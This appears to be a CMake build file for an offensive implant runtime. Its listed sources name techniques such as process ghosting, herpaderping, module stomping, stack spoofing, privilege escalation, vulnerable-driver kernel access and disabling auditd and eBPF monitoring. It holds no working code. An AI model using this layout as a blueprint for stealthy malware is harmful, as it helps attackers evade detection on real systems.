# ── jrt-core: Bare C + inline ASM runtime ──────────────────────────
# This must NOT link any standard library on the target.
# It is compiled as a static library and linked into the final binary.
add_library(jrt-core STATIC
    jrt-core/syscall/syscall_win.c
    jrt-core/syscall/syscall_linux.c
    jrt-core/allocator/allocator.c
    jrt-core/exec/module_stomp.c
    jrt-core/exec/ghost.c
    jrt-core/exec/herp.c
    jrt-core/exec/memfd.c
    jrt-core/crypto/string_decrypt.c
    jrt-core/crypto/stack_zero.c
    jrt-core/tls/tls13.c
    jrt-core/spoof/stack_spoof.c
    jrt-core/init.c
)

target_include_directories(jrt-core PUBLIC
    ${CMAKE_CURRENT_SOURCE_DIR}/jrt-core   # "syscall/…", "allocator/…", "jrt_core.h"
)

target_compile_options(jrt-core PRIVATE
    -nostdlib           # No C standard library
    -fno-stack-protector
    -fno-exceptions
    -fPIC               # Position-independent code
    -Os                 # Optimize for size
)

# Conditional: only compile Windows files when targeting Windows
if(JOCKEY_TARGET_WINDOWS OR WIN32)
    target_compile_definitions(jrt-core PRIVATE JRT_TARGET_WINDOWS=1)
endif()
if(JOCKEY_TARGET_LINUX OR (UNIX AND NOT APPLE))
    target_compile_definitions(jrt-core PRIVATE JRT_TARGET_LINUX=1)
endif()

# ── jrt-escalate ───────────────────────────────────────────────────
add_library(jrt-escalate STATIC
    jrt-escalate/engine/escalation_engine.cpp
)
target_include_directories(jrt-escalate PUBLIC
    jrt-escalate/include
)
target_link_libraries(jrt-escalate PRIVATE jrt-core)

# ── jrt-blind ──────────────────────────────────────────────────────
add_library(jrt-blind STATIC
    jrt-blind/byovd/driver_loader.c
    jrt-blind/byovd/kernel_rw.c
    jrt-blind/callbacks/callback_strip.c
    jrt-blind/linux/auditd_control.c
    jrt-blind/linux/ebpf_detach.c
    jrt-blind/linux/lkm_control.c
    jrt-blind/blind.c
)
target_include_directories(jrt-blind PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/jrt-blind
)
target_link_libraries(jrt-blind PRIVATE jrt-core)
